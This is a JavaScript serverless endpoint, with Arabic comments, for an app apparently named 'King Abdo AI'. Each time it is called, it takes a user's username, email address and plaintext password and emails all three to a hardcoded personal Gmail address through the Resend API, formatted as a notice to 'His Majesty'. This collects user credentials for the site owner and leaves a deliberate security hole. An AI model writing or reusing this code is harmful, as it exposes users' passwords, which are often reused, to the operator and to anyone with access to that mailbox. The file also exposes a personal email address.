// 📁 api/notify-owner.js
export default async function handler(req, res) {
    // ✅ تحقق من نوع req.body وتحليله بشكل آمن
    let body;
    try {
        if (typeof req.body === 'string') {
            body = JSON.parse(req.body);
        } else if (req.body) {
            body = req.body; // لو كان object بالفعل
        } else {
            return res.status(400).json({ error: 'No body provided' });
        }
    } catch (e) {
        console.error('❌ خطأ في تحليل JSON:', e);
        return res.status(400).json({ error: 'Invalid JSON format' });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { userEmail, username, userPassword } = body;

        if (!userEmail || !username || !userPassword) {
            return res.status(400).json({ error: 'Missing user data' });
        }

        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.RESEND_API_KEY}`
            },
            body: JSON.stringify({
                from: 'King Abdo AI <onboarding@resend.dev>',
                to: 'abdalrhmanmohmaed717@gmail.com',
                subject: '👑 تسجيل دخول جديد في بلاط الملك عبدو',
                html: `
                    <div style="font-family: 'Amiri', serif; direction: rtl; text-align: right; padding: 20px; background: #0d1b2a; color: #e0e1dd; border-radius: 10px;">
                        <h2 style="color: #FFD700; border-bottom: 2px solid #FFD700; padding-bottom: 10px;">جلالة الملك، هناك ضيف جديد في البلاط!</h2>
                        <p><strong>👑 اسم المستخدم:</strong> ${username}</p>
                        <p><strong>📧 البريد الإلكتروني:</strong> ${userEmail}</p>
                        <p><strong>🔑 كلمة المرور:</strong> ${userPassword}</p>
                        <p><strong>🕒 وقت التسجيل:</strong> ${new Date().toLocaleString('ar-EG')}</p>
                        <hr style="border-color: #3e92cc; margin: 20px 0;">
                        <p style="color: #555; font-size: 0.9rem;">هذا إشعار تلقائي من نظام KING ABDO AI — خادمك المخلص.</p>
                    </div>
                `
            })
        });

        const data = await response.json();

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            console.error('❌ خطأ في إرسال الإشعار:', data);
            return res.status(500).json({ error: 'Failed to send notification' });
        }

    } catch (error) {
        console.error('🔥 خطأ في الخادم:', error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
